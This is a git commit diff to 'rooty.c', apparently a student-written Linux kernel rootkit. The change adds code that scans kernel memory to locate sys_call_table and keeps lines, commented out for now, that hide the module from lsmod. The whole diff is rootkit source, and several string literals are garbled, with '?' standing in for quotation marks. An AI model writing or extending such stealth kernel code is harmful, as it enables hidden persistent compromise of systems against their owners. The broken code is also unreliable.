c62c68ad72e8ba298c09edfbd41f08edfeda3ef0
des <sachedes@students.zhaw.ch>
2014-06-18 15:44:20 +0200

    added search for sys_call_table

--- rooty.c
+++ rooty.c
@@ -8,11 +8,36 @@ void rooty_exit(void);
 module_init(rooty_init);
 module_exit(rooty_exit);
 
+/* find sys_call_table */
+
+psize *sys_call_table;
+psize **find(void) {
+ psize **sctable;
+ psize i = START_CHECK;
+ while (i < END_CHECK) {
+  sctable = (psize **) i;
+  if (sctable[__NR_CLOSE] == (psize *) sys_close) {
+   return &sctable[0];
+  } 
+  i += sizeof(void *);
+ }
+ return NULL;
+}
+
 int rooty_init(void) {
-#  list_del_init(&__this_module.list);
-#  kobject_del(&THIS_MODULE->mkobj.kobj);
+  
+/* Hide module from lsmod - commented out for troubleshooting reasons, will be activated again at the end  
+  list_del_init(&__this_module.list);
+  kobject_del(&THIS_MODULE->mkobj.kobj); */
   
  printk("rooty: module loaded\n");
+ 
+/* added check for sys_call_table found or not  */
+  if (sys_call_table = (psize *) find()) {
+  printk(?rooty: sys_call_table found at %p\n?,sys_call_table);
+  } else {
+  printk(?rooty: sys_call_table not found\n?);
+  }
  return 0;
 }
 
